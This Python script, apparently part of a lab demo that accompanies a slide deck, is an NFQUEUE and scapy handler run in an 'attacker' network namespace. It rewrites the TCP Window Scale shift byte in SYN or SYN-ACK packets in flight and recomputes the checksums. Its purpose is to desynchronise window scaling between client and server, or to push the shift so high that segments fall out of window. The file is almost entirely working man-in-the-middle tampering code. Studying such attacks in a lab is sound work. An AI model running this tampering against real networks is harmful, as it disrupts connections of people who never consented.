#!/usr/bin/env python3
"""Core rewrite: NFQUEUE handler that edits the TCP Window Scale option shift byte
in flight (the "Handshake Tampering" / "Packet & Frame Structure" slides).

Per the timing diagram, the default target is the client's pure SYN only (--target
client-syn), deflating shift 7->0 so the server thinks the client's window is
unscaled while the client keeps scaling by 2^7 -- that's the desync. --target
server-synack or --target both are provided too, e.g. to inflate the shift instead
(0->14) and demonstrate the overshoot/out-of-window failure mode from the deck's
"Expected Outcome" slide.

Only the WScale option byte changes; packet length is untouched so no
re-segmentation or length-field fixups are needed -- just the checksums.

Run in the attacker namespace, after attacker/divert_rules.sh setup:
    ip netns exec wscale-attacker python3 attacker/wscale_attack.py \\
        --queue-num 0 --new-shift 0 --target client-syn --client-ip 10.0.0.1
"""
import argparse
import logging

from netfilterqueue import NetfilterQueue
from scapy.all import IP, TCP

logging.basicConfig(level=logging.INFO, format="%(asctime)s %(message)s")
log = logging.getLogger("wscale-attack")

SYN_ACK_MASK = 0x12  # SYN | ACK flag bits
SYN_ONLY = 0x02
SYN_ACK = 0x12


def parse_args():
    p = argparse.ArgumentParser(description=__doc__, formatter_class=argparse.RawDescriptionHelpFormatter)
    p.add_argument("--queue-num", type=int, default=0)
    p.add_argument("--new-shift", type=int, required=True, choices=range(0, 15), metavar="[0-14]")
    p.add_argument(
        "--target", choices=["client-syn", "server-synack", "both"], default="client-syn",
        help="which side of the handshake to tamper with (default matches the deck's diagram)",
    )
    p.add_argument("--client-ip", help="disambiguate direction when both hosts could send matching flags")
    return p.parse_args()


def get_wscale(tcp_layer):
    for name, value in tcp_layer.options:
        if name == "WScale":
            return value
    return None


def set_wscale(tcp_layer, new_val):
    new_opts = []
    changed = False
    for name, value in tcp_layer.options:
        if name == "WScale":
            new_opts.append(("WScale", new_val))
            changed = True
        else:
            new_opts.append((name, value))
    tcp_layer.options = new_opts
    return changed


def make_handler(args):
    def handle(pkt):
        raw = pkt.get_payload()
        ip = IP(raw)
        if not ip.haslayer(TCP):
            pkt.accept()
            return
        tcp = ip[TCP]
        flag_bits = tcp.flags.value if hasattr(tcp.flags, "value") else int(tcp.flags)
        is_syn_only = (flag_bits & SYN_ACK_MASK) == SYN_ONLY
        is_syn_ack = (flag_bits & SYN_ACK_MASK) == SYN_ACK

        should_edit = False
        if args.target == "client-syn" and is_syn_only:
            should_edit = args.client_ip is None or ip.src == args.client_ip
        elif args.target == "server-synack" and is_syn_ack:
            should_edit = args.client_ip is None or ip.dst == args.client_ip
        elif args.target == "both" and (is_syn_only or is_syn_ack):
            should_edit = True

        if should_edit:
            old = get_wscale(tcp)
            if old is not None and old != args.new_shift:
                if set_wscale(tcp, args.new_shift):
                    del tcp.chksum
                    del ip.chksum  # force scapy to recompute both on serialize
                    new_raw = bytes(ip)
                    log.info(
                        "rewrote WScale %s:%d -> %s:%d  shift %d -> %d",
                        ip.src, tcp.sport, ip.dst, tcp.dport, old, args.new_shift,
                    )
                    pkt.set_payload(new_raw)
        pkt.accept()

    return handle


def main():
    args = parse_args()
    nfq = NetfilterQueue()
    nfq.bind(args.queue_num, make_handler(args))
    log.info(
        "listening on NFQUEUE %d (target=%s, new_shift=%d) -- Ctrl+C to stop",
        args.queue_num, args.target, args.new_shift,
    )
    try:
        nfq.run()
    except KeyboardInterrupt:
        pass
    finally:
        nfq.unbind()


if __name__ == "__main__":
    main()
